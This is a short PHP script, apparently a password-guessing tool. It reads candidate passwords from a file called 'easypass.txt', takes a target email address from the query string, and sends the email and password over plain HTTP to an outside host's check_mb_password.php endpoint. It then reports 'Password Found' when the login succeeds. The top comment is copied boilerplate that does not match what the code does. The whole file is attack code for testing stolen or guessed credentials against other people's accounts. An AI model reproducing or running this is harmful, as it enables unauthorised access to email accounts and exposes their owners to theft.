<?php
// Get a file into an array.  In this example we'll go through HTTP to get
// the HTML source of a URL.
$passwords = file('easypass.txt');
$email = $_GET['email'];
$password = $passwords[0];
$passright = file_get_contents('http://raha.pizzaroot.netne.net/check_mb_password.php?login='.$email.'&password='.$password);
if ($passright == 1)
{
	echo 'Password Found: '.$password;
}
else
{
	echo 'Password Not Match: '.$password;
}
?>